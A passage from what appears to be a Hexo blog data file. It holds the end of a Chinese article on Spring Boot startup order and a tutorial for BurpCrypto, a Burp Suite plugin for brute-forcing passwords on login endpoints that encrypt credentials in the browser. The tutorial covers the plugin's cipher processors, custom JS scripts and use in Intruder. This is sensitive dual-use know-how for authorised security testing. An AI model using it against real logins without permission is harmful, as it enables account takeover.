之后开启流量。</p>\n</blockquote>\n<p>Http、MQ、Rpc 入口流量必须在 <code>SmartInitializingSingleton</code> 之后开启流量。</p>\n<p><strong>15.Spring 提供的扩展点，在所有单例Bean的 EventListener等组件全部启动完成后，即Spring启动完成，则执行 start 方法。在这个位置适合开启入口流量！</strong></p>\n<p>Http、MQ、Rpc 入口流量适合 在 <code>SmartLifecyle</code> 中开启</p>\n<p><strong>16.发布 ContextRefreshedEvent 方法</strong></p>\n<p>该事件会执行多次，在 <code>Spring Refresh</code> 执行完成后，就会发布该事件！</p>\n<p><strong>17.注册和初始化 Spring MVC</strong></p>\n<p>SpringBoot 应用，在父级 Spring启动完成后，会尝试启动 内嵌式 tomcat容器。在此之前，SpringBoot会初始化 SpringMVC 和注册<code>DispatcherServlet</code>到Web容器。</p>\n<p><strong>18.Tomcat&#x2F;Jetty 容器开启端口</strong></p>\n<p>SpringBoot 调用内嵌式容器，会开启并监听端口，此时Http流量就开启了。</p>\n<p><strong>19.应用启动完成后，执行 CommandLineRunner</strong></p>\n<p>SpringBoot 特有的机制，待所有的完全执行完成后，会执行该接口 run方法。值得一提的是，由于此时Http流量已经开启，如果此时进行本地缓存初始化、预热缓存等，稍微有些晚了！在这个间隔期，可能缓存还未就绪！</p>\n<p>所以预热缓存的时机应该发生在 入口流量开启之前，比较合适的机会是在 Bean初始化的阶段。虽然 在Bean初始化时 Spring尚未完成启动，但是调用 Bean预热缓存也是可以的。但是注意：不要在 Bean初始化时 使用 Spring Event，因为它还未完成初始化 。</p>\n<h2 id=\"回答-关于-Spring-启动原理的若干问题\"><a href=\"#回答-关于-Spring-启动原理的若干问题\" class=\"headerlink\" title=\"回答 关于 Spring 启动原理的若干问题\"></a>回答 关于 Spring 启动原理的若干问题</h2><p><strong>1.init-method、PostConstruct、afterPropertiesSet 三个方法的执行顺序。</strong></p>\n<p>回答：<code>PostConstruct</code>，<code>afterPropertiesSet</code>，<code>init-method</code></p>\n<p><strong>2.有两个 Bean声明了初始化方法。A使用 PostConstruct注解声明，B使用 init-method 声明。Spring一定先执行 A 的PostConstruct 方法吗？</strong></p>\n<p>回答：Spring 会循环初始化Bean实例，初始化完成1个Bean，再初始化下一个Bean。Spring并没有使用这种机制启动，即所有的Bean先执行 <code>PostConstruct</code>，再统一执行<code>afterProperfiesSet</code>。</p>\n<p>此外，A、B两个Bean的初始化顺序不确定，谁先谁后不确定。无法保证 A 的<code>PostConstruct</code> 一定先执行。除非使用 Order注解，声明Bean的初始化顺序！</p>\n<p><strong>3.Spring 何时装配Autowire属性，PostConstruct方法中引用 Autowired 字段是否会空指针?</strong></p>\n<p>Autowired装配依赖发生在 <code>PostConstruct</code>之前，不会出现空指针！</p>\n<p><strong>4.PostConstruct 中方法依赖ApplicationContextAware拿到 ApplicationContext，两者的顺序谁先谁后？是否会出现空指针!</strong></p>\n<p><code>ApplicationContextAware</code> 会先执行，不会出现空指针！但是当Autowired没有找到对应的依赖，并且声明了非强制依赖时，该字段会为空，有潜在 空指针风险。</p>\n<p><strong>5.项目应该如何监听 Spring 的启动就绪事件。</strong></p>\n<p>通过<code>SmartLifecyle start</code>方法，监听Spring就绪 。适合在此开启入口流量！</p>\n<p><strong>6.项目如何监听Spring 刷新事件。</strong></p>\n<p>监听<code>Spring Event ContextRefreshedEvent</code></p>\n<p><strong>7.Spring就绪事件和刷新事件的执行顺序和区别。</strong></p>\n<p>Spring就绪事件会先于 刷新事件。两者都可能多次执行，要确保方法的幂等处理，避免重复注册问题</p>\n<p><strong>8.Http 流量入口何时启动完成。</strong></p>\n<p>SpringBoot 最后阶段，启动完成Spring 上下文，才开启Http入口流量，此时 SmartLifecycle#start 已执行。所有单例Bean和SpringEvent等组件都已经就绪！</p>\n<p><strong>9.项目中在 init-method 方法中注册 Rpc是否合理？什么是合理的时机？</strong></p>\n<p>init 开启Rpc流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p>\n<p><strong>10.项目中在 init-method 方法中注册 MQ消费组是否合理？什么是合理的时机？</strong></p>\n<p>init 开启 MQ 流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p>\n<p><strong>11.Spring还未完全启动，在 PostConstruct 中调用 getBeanByAnnotation能否获得准确的结果？</strong></p>\n<p>虽然未启动完成，但是Spring执行该<code>getBeanByAnnotation</code>方法时，会率先检查 Bean定义，如果Bean定义对应的 Bean尚未初始化，则初始化这些Bean。所以即便是Spring初始化过程中调用，调用结果是准确的。</p>\n<h2 id=\"源码级别介绍\"><a href=\"#源码级别介绍\" class=\"headerlink\" title=\"源码级别介绍\"></a>源码级别介绍</h2><h4 id=\"SmartInitializingSingleton-接口的执行位置\"><a href=\"#SmartInitializingSingleton-接口的执行位置\" class=\"headerlink\" title=\"SmartInitializingSingleton 接口的执行位置\"></a>SmartInitializingSingleton 接口的执行位置</h4><p>下图代码说明了，Spring在初始化全部 单例Bean以后，会执行 <code>SmartInitializingSingleton</code> 接口。</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/3.png\"></p>\n<h4 id=\"Autowired-何时装配Bean的依赖\"><a href=\"#Autowired-何时装配Bean的依赖\" class=\"headerlink\" title=\"Autowired 何时装配Bean的依赖\"></a>Autowired 何时装配Bean的依赖</h4><p>在Bean实例化之后，但初始化之前，<code>AutowiredAnnotationBeanPostProcessor</code> 会注入Autowired字段。</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/4.png\"></p>\n<h4 id=\"SpringBoot-何时开启Http端口\"><a href=\"#SpringBoot-何时开启Http端口\" class=\"headerlink\" title=\"SpringBoot 何时开启Http端口\"></a>SpringBoot 何时开启Http端口</h4><p>下图代码中可以看到，SpringBoot会首先启动 Spring上下文，完成后才启动 嵌入式Web容器，初始化SpringMVC，监听端口</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/5.png\"></p>\n<h4 id=\"Spring-初始化Bean的关键代码\"><a href=\"#Spring-初始化Bean的关键代码\" class=\"headerlink\" title=\"Spring 初始化Bean的关键代码\"></a>Spring 初始化Bean的关键代码</h4><p>下图我加了注释，Spring初始化Bean的关键代码，全在 这个方法里，感兴趣的可以自行查阅代码 。</p>\n<p>AbstractAutowireCapableBeanFactory#initializeBean</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/6.png\"></p>\n<h4 id=\"Spring-CommandLineRunner-执行位置\"><a href=\"#Spring-CommandLineRunner-执行位置\" class=\"headerlink\" title=\"Spring CommandLineRunner 执行位置\"></a>Spring CommandLineRunner 执行位置</h4><p>Spring Boot外部，当启动完Spring上下文以后，最后才启动 <code>CommandLineRunner</code>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/7.png\"><br>总结</h2><p>SpringBoot 会在Spring完全启动完成后，才开启Http流量。这给了我们启示：应该在Spring启动完成后开启入口流量。Rpc和 MQ流量 也应该如此，所以建议大家 在 <code>SmartLifecype</code> 或者 <code>ContextRefreshedEvent</code> 等位置 注册服务，开启流量。</p>\n<p>例如Spring Cloud Eureka 服务发现组件，就是在 <code>SmartLifecype</code>中注册服务的！</p>\n<p>整理10 个小时写完本篇文章，希望大家有所收获。</p>\n"},{"title":"万能网站密码爆破测试工具-BurpCrypto","date":"2024-07-14T11:09:43.000Z","_content":"\n\n\nBurpCrypto是一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuit插件。\n\n\n\n**一、编译**\n\n```\nmvn package\n```\n\n\n\n**二、为什么解决了痛点**\n\n目前越来越多的网站系统在登录接口、数据请求接口中加入各式各样的加密算法，甚至有些网站在每次请求前都动态请求加密密钥等措施，对接口渗透工作造成较大障碍。依赖于BurpSuite中的那些编码方式、Hash算法已经远远不够，通过BurpCrypto内置的RSA、AES、DES模块可应对较为简单的前端加密接口，较为复杂的加密算法，可使用ExecJS模块直接手动编写处理代码。同时为了降低ExecJS模块的上手难度，未来将推出远程JS模块仓库，支持远程加载已经测试通过的JS功能代码，方便直接调用。\n\n\n\n**三、未来开发计划**\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/1.png)\n\nBurpCrypto可从其官方Github页面进行下载已编译好的版本，或下载源代码本地编译，然后在BurpSuite的扩展列表中添加插件，等待Output中输出`BurpCrypto loaded successfully!`则表示插件加载成功。\n\n\n\n---\n\n**五、基础加密模块使用**\n--------------\n\n基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\n------------------------------------------------------------------------\n\n*   Base64\n\n*   HEX\n\n*   UTF8String\n\n\n密文输出所支持的编码方式有如下两种\n\n*   Base64\n\n*   HEX\n\n\nExecJS模块的输出内容由JS代码决定。\n\n#### **六、编码方式的辨别方法**\n\n> 为了照顾到对编码方式不了解的朋友，此处会简单讲解这些编码方式的辨别方法，已经了解的朋友可直接跳过参阅下一章节的具体使用讲解.\n\nBase64编码与HEX编码常常用于编码二进制数据，UTF8String则是我们操作系统、网页中最常见的字符串的编码方式，下方是Base64、HEX、UTF8String编码的示例：\n\n```\n对字符串\"test_z\"进行Base64、HEX编码的结果  \nBase64：dGVzdF96  \nHEX：746573745f7a  \nUTF8String：test_z\n```\n\nAES和DES加密都属于对称加密算法，既加解密使用同一套密钥的加密算法，同时也是目前前端加密中较为常见的加密算法，目前插件支持的AES加密算法有：\n\n*   AES/CBC/PKCS5Padding\n\n*   AES/CBC/NoPadding\n\n*   AES/CBC/ZeroPadding\n\n*   AES/ECB/PKCS5Padding\n\n*   AES/ECB/NoPadding\n\n*   AES/ECB/ZeroPadding\n\n*   AES/OFB/PKCS5Padding\n\n*   AES/OFB/NoPadding\n\n*   AES/OFB/ZeroPadding\n\n*   AES/CFB/PKCS5Padding\n\n*   AES/CFB/NoPadding\n\n*   AES/CFB/ZeroPadding\n\n*   AES/CTR/PKCS5Padding\n\n*   AES/CTR/NoPadding\n\n*   AES/CTR/ZeroPadding\n\n\nDES加密算法有：\n\n*   DES/CBC/PKCS5Padding\n\n*   DES/CBC/ZeroPadding\n\n*   DES/CBC/NoPadding\n\n*   DES/ECB/PKCS5Padding\n\n*   DES/ECB/ZeroPadding\n\n*   DES/ECB/NoPadding\n\n*   DES/OFB/PKCS5Padding\n\n*   DES/OFB/ZeroPadding\n\n*   DES/OFB/NoPadding\n\n*   DES/CFB/PKCS5Padding\n\n*   DES/CFB/ZeroPadding\n\n*   DES/CFB/NoPadding\n\n*   DESede/CBC/PKCS5Padding\n\n*   DESede/CBC/ZeroPadding\n\n*   DESede/CBC/NoPadding\n\n*   DESede/ECB/PKCS5Padding\n\n*   DESede/ECB/ZeroPadding\n\n*   DESede/ECB/NoPadding\n\n*   DESede/OFB/PKCS5Padding\n\n*   DESede/OFB/ZeroPadding\n\n*   DESede/OFB/NoPadding\n\n*   DESede/CFB/PKCS5Padding\n\n*   DESede/CFB/ZeroPadding\n\n*   DESede/CFB/NoPadding\n\n*   strEnc\n\n\n> 在前端JS中常常会使用PKCS7Padding，在本模块中可使用PKCS5Padding代替，不影响使用。\n>\n> DES加密中的strEnc算法是取自作者Guapo的一种3DES的模块，在少数系统中被使用，此处为了方便使用也引入了进来。\n\n#### 非对称加密算法\n\nRSA算法则属于非对称加密算法，密钥分为公钥与私钥，暂时仅支持公钥加密，RSA加密支持两种公钥格式的输入，分别为\n\n*   X509\n\n*   ModulusAndExponent\n\n\nX509密钥格式表现为一串由Base64编码后的字符串，常常以`MIG`开头。ModulusAndExponent(模数，指数)则表现为两个HEX编码的参数，Modulus是模数，常常较长，Exponent是指数，常常只有6位，以下为密钥示例：\n\n```\nX509: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC0hrRIjb3noDWNtbDpANbjt5Iwu2NFeDwU16Ec87ToqeoIm2KI+cOs81JP9aTDk/jkAlU97mN8wZkEMDr5utAZtMVht7GLX33Wx9XjqxUsDfsGkqNL8dXJklWDu9Zh80Ui2Ug+340d5dZtKtd+nv09QZqGjdnSp9PTfFDBY133QIDAQAB  \nModulusAndExponent:  \n  Modulus: A1E4D93618B8B240530853E87738403851E15BBB77421F9B2377FB0B4F1C6FC235EAEC92EA25BB76AC221DCE90173A2E232FE1511909C76B15251D4059B288E709C1EF86BCF692757AAD736882DD1E98BEDFED9311A3C22C40657C9A52880BDC4B9E539041D44D52CB26AD13AB086F7DC294D144D6633A62EF91CA1775EB9A09  \n  Exponent: 010001\n```\n\n####   \n\n#### **七、使用**\n\n#### 使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击`Add processor`，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示`Apply processor success!`即表示添加成功。\n\n此处以AES的CBC模式，填充Pkcs7，Key：Y3MxMTg1MzUyOS4x，IV：9875643210132456，Base64编码的方式做为示例。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/2.png)\n\n若要删除processor则要点击`Remove processor`，输入刚刚编写的配置名，即可删除。\n\n> 关于前端加密的分析过程可参阅jsEncrypter开发者c0ny1的文章：https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/\n\n**八、补充阅读**\n\n\n\n对单加密参数的登录接口进行密码爆破的一种方法，ExecJS模块使用由于软件开发的复杂性，诸如多层嵌套加密、引入时间变量、动态密钥、魔改加密算法、新算法的涌现，插件注定永远无法做到对所有加密算法的百分百覆盖，所以提供了ExecJS模块，为动手能力较强的使用者提供一条新途径。\n\n> 因JS新特性的快速迭代，插件中内置了Rhino、HtmlUnit、Jre内置三种JS执行引擎，各种执行引擎的优劣势可参阅BurpCrypto未来开发计划中对于各个引擎的特性介绍。\n\n### **九、编写简单的JS脚本**\n\n###   \n\n### 使用ExecJS模块前需要先切换至插件的`ExecJS`选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理/加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\n\n为了方便使用，插件内置了一个快速生成函数体的菜单，在代码编辑器中的右键菜单中点击`Append Simple Function`，即可生成一个空函数`calc`，并自动在下面的入口函数名填写入口函数为`calc`。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/3.png)\n\n我们可以对该函数进行一些简单的修改，下面是一个示例脚本，该脚本将会把输入的内容倒转后再返回。\n\n```\nfunction calc(pass) {  \n     return pass.split(\"\").reverse().join(\"\");  \n}\n```\n\n编辑完成后，点击`Add processor`即可添加成功。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/4.png)\n\n### **十、引用内置JS库**\n\n> 目前内置的JS库只有MD5与Base64，后续版本将会上线在线JS仓库，操作步骤将会发生变动。\n\n为避免常见库的频繁整理导入的工作量，插件目前内置了MD5和Base64库，使用方法为在编辑器的右键菜单中的`Include Snippet`选中需要的JS库，即可引入。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/5.png)\n\n**十一、在功能区中调用插件**\n\n\n\n加密，通过在上述几个模块中成功添加processor后，即可通过以下两个渠道进行使用。\n\nQuickCrypto（全局调用）\n\nBurpCrypto几乎可以在BurpSuite的任何位置进行调用，调用方法也较为简单，以下动图为示例：\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/6.png)\n\n**十二、Intruder（爆破模块）**\n\n\n\n在爆破模块中引用：\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/7.png)\n\n### **十三、解密（查询原文）**\n\n\n\n由于部分算法产生的结果具有不可逆性（哈希算法、自定义的JS代码等），所以通过本插件生成的所有结果均被保存到本地的K/V数据库中，可以通过插件中的`Get PlainText`功能获取原始明文。\n\n使用方法为完整选中密文内容，右单击后找到BurpCrypto菜单中的`Get PlainText`功能，\n\n> 此处演示的是RSA公钥加密后通过密文查询原始明文。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/8.png)\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/9.png)\n\n**十四、结尾**\n\n\n\n以上为本插件的使用说明，后续将会将会陆续加入国密算法、ExecJS远程模块，模块互调等小功能更新与Bug修复，如果各位师傅有更多的建议也欢迎提PR或者Issure，谢谢！\n\n\n\n****本文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！****","source":"_posts/万能网站密码爆破测试工具-BurpCrypto.md","raw":"---\ntitle: 万能网站密码爆破测试工具-BurpCrypto\ndate: 2024-07-14 19:09:43\ntags: 密码爆破\ncategories: 工具\n---\n\n\n\nBurpCrypto是一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuit插件。\n\n\n\n**一、编译**\n\n```\nmvn package\n```\n\n\n\n**二、为什么解决了痛点**\n\n目前越来越多的网站系统在登录接口、数据请求接口中加入各式各样的加密算法，甚至有些网站在每次请求前都动态请求加密密钥等措施，对接口渗透工作造成较大障碍。依赖于BurpSuite中的那些编码方式、Hash算法已经远远不够，通过BurpCrypto内置的RSA、AES、DES模块可应对较为简单的前端加密接口，较为复杂的加密算法，可使用ExecJS模块直接手动编写处理代码。同时为了降低ExecJS模块的上手难度，未来将推出远程JS模块仓库，支持远程加载已经测试通过的JS功能代码，方便直接调用。\n\n\n\n**三、未来开发计划**\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/1.png)\n\nBurpCrypto可从其官方Github页面进行下载已编译好的版本，或下载源代码本地编译，然后在BurpSuite的扩展列表中添加插件，等待Output中输出`BurpCrypto loaded successfully!`则表示插件加载成功。\n\n\n\n---\n\n**五、基础加密模块使用**\n--------------\n\n基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\n------------------------------------------------------------------------\n\n*   Base64\n\n*   HEX\n\n*   UTF8String\n\n\n密文输出所支持的编码方式有如下两种\n\n*   Base64\n\n*   HEX\n\n\nExecJS模块的输出内容由JS代码决定。\n\n#### **六、编码方式的辨别方法**\n\n> 为了照顾到对编码方式不了解的朋友，此处会简单讲解这些编码方式的辨别方法，已经了解的朋友可直接跳过参阅下一章节的具体使用讲解.\n\nBase64编码与HEX编码常常用于编码二进制数据，UTF8String则是我们操作系统、网页中最常见的字符串的编码方式，下方是Base64、HEX、UTF8String编码的示例：\n\n```\n对字符串\"test_z\"进行Base64、HEX编码的结果  \nBase64：dGVzdF96  \nHEX：746573745f7a  \nUTF8String：test_z\n```\n\nAES和DES加密都属于对称加密算法，既加解密使用同一套密钥的加密算法，同时也是目前前端加密中较为常见的加密算法，目前插件支持的AES加密算法有：\n\n*   AES/CBC/PKCS5Padding\n\n*   AES/CBC/NoPadding\n\n*   AES/CBC/ZeroPadding\n\n*   AES/ECB/PKCS5Padding\n\n*   AES/ECB/NoPadding\n\n*   AES/ECB/ZeroPadding\n\n*   AES/OFB/PKCS5Padding\n\n*   AES/OFB/NoPadding\n\n*   AES/OFB/ZeroPadding\n\n*   AES/CFB/PKCS5Padding\n\n*   AES/CFB/NoPadding\n\n*   AES/CFB/ZeroPadding\n\n*   AES/CTR/PKCS5Padding\n\n*   AES/CTR/NoPadding\n\n*   AES/CTR/ZeroPadding\n\n\nDES加密算法有：\n\n*   DES/CBC/PKCS5Padding\n\n*   DES/CBC/ZeroPadding\n\n*   DES/CBC/NoPadding\n\n*   DES/ECB/PKCS5Padding\n\n*   DES/ECB/ZeroPadding\n\n*   DES/ECB/NoPadding\n\n*   DES/OFB/PKCS5Padding\n\n*   DES/OFB/ZeroPadding\n\n*   DES/OFB/NoPadding\n\n*   DES/CFB/PKCS5Padding\n\n*   DES/CFB/ZeroPadding\n\n*   DES/CFB/NoPadding\n\n*   DESede/CBC/PKCS5Padding\n\n*   DESede/CBC/ZeroPadding\n\n*   DESede/CBC/NoPadding\n\n*   DESede/ECB/PKCS5Padding\n\n*   DESede/ECB/ZeroPadding\n\n*   DESede/ECB/NoPadding\n\n*   DESede/OFB/PKCS5Padding\n\n*   DESede/OFB/ZeroPadding\n\n*   DESede/OFB/NoPadding\n\n*   DESede/CFB/PKCS5Padding\n\n*   DESede/CFB/ZeroPadding\n\n*   DESede/CFB/NoPadding\n\n*   strEnc\n\n\n> 在前端JS中常常会使用PKCS7Padding，在本模块中可使用PKCS5Padding代替，不影响使用。\n>\n> DES加密中的strEnc算法是取自作者Guapo的一种3DES的模块，在少数系统中被使用，此处为了方便使用也引入了进来。\n\n#### 非对称加密算法\n\nRSA算法则属于非对称加密算法，密钥分为公钥与私钥，暂时仅支持公钥加密，RSA加密支持两种公钥格式的输入，分别为\n\n*   X509\n\n*   ModulusAndExponent\n\n\nX509密钥格式表现为一串由Base64编码后的字符串，常常以`MIG`开头。ModulusAndExponent(模数，指数)则表现为两个HEX编码的参数，Modulus是模数，常常较长，Exponent是指数，常常只有6位，以下为密钥示例：\n\n```\nX509: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC0hrRIjb3noDWNtbDpANbjt5Iwu2NFeDwU16Ec87ToqeoIm2KI+cOs81JP9aTDk/jkAlU97mN8wZkEMDr5utAZtMVht7GLX33Wx9XjqxUsDfsGkqNL8dXJklWDu9Zh80Ui2Ug+340d5dZtKtd+nv09QZqGjdnSp9PTfFDBY133QIDAQAB  \nModulusAndExponent:  \n  Modulus: A1E4D93618B8B240530853E87738403851E15BBB77421F9B2377FB0B4F1C6FC235EAEC92EA25BB76AC221DCE90173A2E232FE1511909C76B15251D4059B288E709C1EF86BCF692757AAD736882DD1E98BEDFED9311A3C22C40657C9A52880BDC4B9E539041D44D52CB26AD13AB086F7DC294D144D6633A62EF91CA1775EB9A09  \n  Exponent: 010001\n```\n\n####   \n\n#### **七、使用**\n\n#### 使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击`Add processor`，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示`Apply processor success!`即表示添加成功。\n\n此处以AES的CBC模式，填充Pkcs7，Key：Y3MxMTg1MzUyOS4x，IV：9875643210132456，Base64编码的方式做为示例。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/2.png)\n\n若要删除processor则要点击`Remove processor`，输入刚刚编写的配置名，即可删除。\n\n> 关于前端加密的分析过程可参阅jsEncrypter开发者c0ny1的文章：https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/\n\n**八、补充阅读**\n\n\n\n对单加密参数的登录接口进行密码爆破的一种方法，ExecJS模块使用由于软件开发的复杂性，诸如多层嵌套加密、引入时间变量、动态密钥、魔改加密算法、新算法的涌现，插件注定永远无法做到对所有加密算法的百分百覆盖，所以提供了ExecJS模块，为动手能力较强的使用者提供一条新途径。\n\n> 因JS新特性的快速迭代，插件中内置了Rhino、HtmlUnit、Jre内置三种JS执行引擎，各种执行引擎的优劣势可参阅BurpCrypto未来开发计划中对于各个引擎的特性介绍。\n\n### **九、编写简单的JS脚本**\n\n###   \n\n### 使用ExecJS模块前需要先切换至插件的`ExecJS`选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理/加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。\n\n为了方便使用，插件内置了一个快速生成函数体的菜单，在代码编辑器中的右键菜单中点击`Append Simple Function`，即可生成一个空函数`calc`，并自动在下面的入口函数名填写入口函数为`calc`。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/3.png)\n\n我们可以对该函数进行一些简单的修改，下面是一个示例脚本，该脚本将会把输入的内容倒转后再返回。\n\n```\nfunction calc(pass) {  \n     return pass.split(\"\").reverse().join(\"\");  \n}\n```\n\n编辑完成后，点击`Add processor`即可添加成功。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/4.png)\n\n### **十、引用内置JS库**\n\n> 目前内置的JS库只有MD5与Base64，后续版本将会上线在线JS仓库，操作步骤将会发生变动。\n\n为避免常见库的频繁整理导入的工作量，插件目前内置了MD5和Base64库，使用方法为在编辑器的右键菜单中的`Include Snippet`选中需要的JS库，即可引入。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/5.png)\n\n**十一、在功能区中调用插件**\n\n\n\n加密，通过在上述几个模块中成功添加processor后，即可通过以下两个渠道进行使用。\n\nQuickCrypto（全局调用）\n\nBurpCrypto几乎可以在BurpSuite的任何位置进行调用，调用方法也较为简单，以下动图为示例：\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/6.png)\n\n**十二、Intruder（爆破模块）**\n\n\n\n在爆破模块中引用：\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/7.png)\n\n### **十三、解密（查询原文）**\n\n\n\n由于部分算法产生的结果具有不可逆性（哈希算法、自定义的JS代码等），所以通过本插件生成的所有结果均被保存到本地的K/V数据库中，可以通过插件中的`Get PlainText`功能获取原始明文。\n\n使用方法为完整选中密文内容，右单击后找到BurpCrypto菜单中的`Get PlainText`功能，\n\n> 此处演示的是RSA公钥加密后通过密文查询原始明文。\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/8.png)\n\n![](./2024/07/14/万能网站密码爆破测试工具-BurpCrypto/9.png)\n\n**十四、结尾**\n\n\n\n以上为本插件的使用说明，后续将会将会陆续加入国密算法、ExecJS远程模块，模块互调等小功能更新与Bug修复，如果各位师傅有更多的建议也欢迎提PR或者Issure，谢谢！\n\n\n\n****本文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！****","slug":"万能网站密码爆破测试工具-BurpCrypto","published":1,"updated":"2024-07-14T11:15:50.685Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryf001gbsuhb0sb98c9","content":"<p>BurpCrypto是一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuit插件。</p>\n<p><strong>一、编译</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mvn package</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>二、为什么解决了痛点</strong></p>\n<p>目前越来越多的网站系统在登录接口、数据请求接口中加入各式各样的加密算法，甚至有些网站在每次请求前都动态请求加密密钥等措施，对接口渗透工作造成较大障碍。依赖于BurpSuite中的那些编码方式、Hash算法已经远远不够，通过BurpCrypto内置的RSA、AES、DES模块可应对较为简单的前端加密接口，较为复杂的加密算法，可使用ExecJS模块直接手动编写处理代码。同时为了降低ExecJS模块的上手难度，未来将推出远程JS模块仓库，支持远程加载已经测试通过的JS功能代码，方便直接调用。</p>\n<p><strong>三、未来开发计划</strong></p>\n<p><img src=\"/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/1.png\"></p>\n<p>BurpCrypto可从其官方Github页面进行下载已编译好的版本，或下载源代码本地编译，然后在BurpSuite的扩展列表中添加插件，等待Output中输出<code>BurpCrypto loaded successfully!</code>则表示插件加载成功。</p>\n<hr>\n<h2 id=\"五、基础加密模块使用\"><a href=\"#五、基础加密模块使用\" class=\"headerlink\" title=\"五、基础加密模块使用\"></a><strong>五、基础加密模块使用</strong></h2><h2 id=\"基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\"><a href=\"#基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\" class=\"headerlink\" title=\"基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种\"></a>基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种</h2><ul>\n<li><p>Base64</p>\n</li>\n<li><p>HEX</p>\n</li>\n<li><p>UTF8String</p>\n</li>\n</ul>\n<p>密文输出所支持的编码方式有如下两种</p>\n<ul>\n<li><p>Base64</p>\n</li>\n<li><p>HEX</p>\n</li>\n</ul>\n<p>ExecJS模块的输出内容由JS代码决定。</p>\n<h4 id=\"六、编码方式的辨别方法\"><a href=\"#六、编码方式的辨别方法\" class=\"headerlink\" 